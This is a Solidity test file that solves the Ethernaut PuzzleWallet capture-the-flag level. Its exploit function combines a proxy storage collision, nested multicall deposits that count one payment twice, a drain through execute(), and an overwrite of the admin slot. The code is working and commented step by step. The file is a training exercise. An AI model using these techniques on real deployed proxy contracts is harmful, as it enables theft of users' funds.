// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/PuzzleWallet.sol";
import "src/levels/PuzzleWalletFactory.sol";

contract TestPuzzleWallet is BaseTest {
    PuzzleProxy private level;
    PuzzleWallet puzzleWallet;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new PuzzleWalletFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /**
         * CODE YOUR SETUP HERE
         */
        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = PuzzleProxy(levelAddress);
        puzzleWallet = PuzzleWallet(address(level));

        // Check that the contract is correctly setup
        assertEq(level.admin(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /**
         * CODE YOUR EXPLOIT HERE
         */

        // The requierements for this level are definetly much more complex than the previous ones
        // Here we have understand how proxies work and have some knowledge storage design patterns these systems may have.
        // This setup uses an unstructured storage pattern, so aquaitance with it and EIP-1967 is needed.

        // The goal here is to become the admin of the proxy
        // Having the knowledge mentioned abovce we can immediately see that there is a storage collision
        // The variables admin and pendingAdmin are not compliant with the EIP-1967 standard
        // They are at risk of being overwritten by the implementation contract

        // We have to use this and knowlegde about delegatecalls to exploit this level

        vm.startPrank(player, player);

        // Lets set pendingAdmin(slot 0) to be player address
        level.proposeNewAdmin(player);

        // Now calling this function will whitelist the player, because this function reads from slot 0, and the context is provided by proxy contract
        // So effectively, player is the owner of puzzleWallet contract
        puzzleWallet.addToWhitelist(player);

        // To become admin, we need to change the slot 1 of the proxy contract using the logic of the implementation contract
        // We can do this by calling setMaxBalance() function with uint256(player), but it requires the contract balance to be 0

        // We can drain the contract balance by calling deposit() function via multicall()
        // But it only allows 1 deposit() call per multicall() to prevent updating balances[msg.sender] multiple times
        // There's a trick: we can call multicall(), which would call deposit() function, but then call multicall() again to call depost() again
        // Kind of a stacked call, which would look like this:
        // --- multicall()
        // ------- deposit()
        // ------- multicall()
        // ----------- deposit()
        // This would set our balance to 2 * 0.001 ether, which is 0.002 ether, but actually only 0.001 ether is deposited

        // Let's construct the array we are going to call with
        // This is the second deposit call
        bytes[] memory deepCall = new bytes[](1);
        deepCall[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);

        // And this is the actual call we make to multicall()
        bytes[] memory calls = new bytes[](2);

        calls[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);
        calls[1] = abi.encodeWithSelector(puzzleWallet.multicall.selector, deepCall);

        // Now we can call multicall() to deposit 0.002 ether but send only 0.001 ether
        puzzleWallet.multicall{value: 0.001 ether}(calls);
        console.log(puzzleWallet.balances(player));

        // Drain the wallet
        puzzleWallet.execute(player, 0.002 ether, new bytes(0));
        console.log(address(puzzleWallet).balance);

        // The last thing is to call setMaxBalance() to change the admin to player address
        puzzleWallet.setMaxBalance(uint256(player));

        vm.stopPrank();
    }
}
